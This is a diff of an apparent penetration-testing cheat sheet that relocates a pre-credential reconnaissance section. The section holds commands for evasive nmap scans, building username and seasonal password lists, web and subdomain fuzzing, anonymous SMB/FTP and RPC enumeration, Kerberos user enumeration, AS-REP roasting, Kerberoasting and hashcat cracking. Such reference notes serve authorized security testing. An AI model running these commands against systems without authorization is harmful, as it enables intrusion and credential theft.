@@ -98,6 +98,63 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_$TARGET__24
 sudo nmap -n -Pn -sS -iL hosts_$TARGET__24 -oA 'TCP_1000_$TARGET__24' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0
 sudo nmap -n -Pn -sS -iL hosts_$TARGET__24 -oA 'TCP_ALL_$TARGET__24' --open --min-rate 250 --max-rate 500 -D 1.1.1.1 -g53 --spoof-mac Cloudflare --mtu 32 --data-length 0 -p-
 
+# Foothold: Information Gathering (Pre-creds)
+## Create Custom Usernames List
+username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
+username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
+
+## Create Custom Passwords List
+psudohash.py -w Password -cpo -cpa -ap '!,!!,?,%,$' -o passwords_custom_password_extended
+sudo kwp -z /usr/local/bin/basechars/full.base /usr/local/bin/keymaps/en-us.keymap /usr/local/bin/routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/keywalk.txt
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-1)) --iter ascii -p -o passwords_custom_seasons_1_year
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-5)) --iter ascii -p -o passwords_custom_seasons_5_years
+spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-10)) --iter ascii -p -o passwords_custom_seasons_10_years
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-1))-$(date +%Y) -o passwords_custom_seasons_1_year_extended
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-5))-$(date +%Y) -o passwords_custom_seasons_5_years_extended
+psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-10))-$(date +%Y) -o passwords_custom_seasons_10_years_extended
+cewler -d 0 http://$TARGET/ -r 50
+
+## Sorting Lists
+cat usernames | sort -u | tee usernames
+cat passwords | sort -u | tee passwords
+cat pwned | sort -u | sort -k5,5
+
+## Web
+whatweb http://$TARGET
+nuclei -u http://$TARGET
+curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
+echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
+domme ://$TARGET
+echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
+creds search pfsense; creds search tomcat
+dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
+ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
+portnock $TARGET 3456 8234 62431 -v
+while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done
+
+## Infrastructure
+nxc smb hosts_ -u 'anonymous' -p '' --shares
+nxc ftp hosts_ -u 'anonymous' -p '' --ls
+cat computers | cut -d '$' -f1 > passwords_computers
+nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
+nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
+for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
+kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
+creds search ftp
+nmap $TARGET --script "ssl* and not brute" -p 443
+KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
+echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
+wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
+smbme $TARGET
+mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
+impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
+tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
+echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
+cp hashes /mnt/c/hashcat
+cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
+
 # Foothold: Tech and Protocols
 ## Web
 [*] Web Shell
@@ -977,64 +1034,6 @@ xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec
 [*] (5985) WINRM
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
-
-# Foothold: Information Gathering (Pre-creds)
-## Create Custom Usernames List
-username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
-username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
-
-## Create Custom Passwords List
-psudohash.py -w Password -cpo -cpa -ap '!,!!,?,%,$' -o passwords_custom_password_extended
-sudo kwp -z /usr/local/bin/basechars/full.base /usr/local/bin/keymaps/en-us.keymap /usr/local/bin/routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/keywalk.txt
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-1)) --iter ascii -p -o passwords_custom_seasons_1_year
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-5)) --iter ascii -p -o passwords_custom_seasons_5_years
-spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-10)) --iter ascii -p -o passwords_custom_seasons_10_years
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-1))-$(date +%Y) -o passwords_custom_seasons_1_year_extended
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-5))-$(date +%Y) -o passwords_custom_seasons_5_years_extended
-psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-10))-$(date +%Y) -o passwords_custom_seasons_10_years_extended
-cewler -d 0 http://$TARGET/ -r 50
-
-## Sorting Lists
-cat usernames | sort -u | tee usernames
-cat passwords | sort -u | tee passwords
-cat pwned | sort -u | sort -k5,5
-
-## Web
-whatweb http://$TARGET
-nuclei -u http://$TARGET
-curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
-echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
-domme ://$TARGET
-echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-creds search pfsense; creds search tomcat
-dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
-ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
-portnock $TARGET 3456 8234 62431 -v
-while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done
-
-## Infrastructure
-nxc smb hosts_ -u 'anonymous' -p '' --shares
-nxc ftp hosts_ -u 'anonymous' -p '' --ls
-cat computers | cut -d '$' -f1 > passwords_computers
-nxc smb hosts_ -u computers -p passwords_computers --no-brute --local-auth
-nmap -iL hosts_ --script "ldap* and not brute" -p 389 | awk '/Nmap scan report/{ip=$NF} /dnsHostName/{h[ip]=h[ip] ? h[ip]" "$3 : $3} END{for (i in h) print i, h[i]}' | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
-for host in $(cat hosts_); do echo "================[  $host  ]================"; rpcclient -U "" -N $host -c "enumdomusers" | grep -oP 'user:\[\K[^]]+' | tr '[:upper:]' '[:lower:]'; echo; done
-kerbrute userenum --dc $TARGET -d $DOM /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 --delay 0 -o $TARGET_userenum.kerbrute
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
-creds search ftp
-nmap $TARGET --script "ssl* and not brute" -p 443
-KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
-echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
-smbme $TARGET
-mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
-impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
-tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
-echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
-cp hashes /mnt/c/hashcat
-cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
-
 
 # Foothold: Exploitation (Post-creds)
 ## Decoding and Decompressing
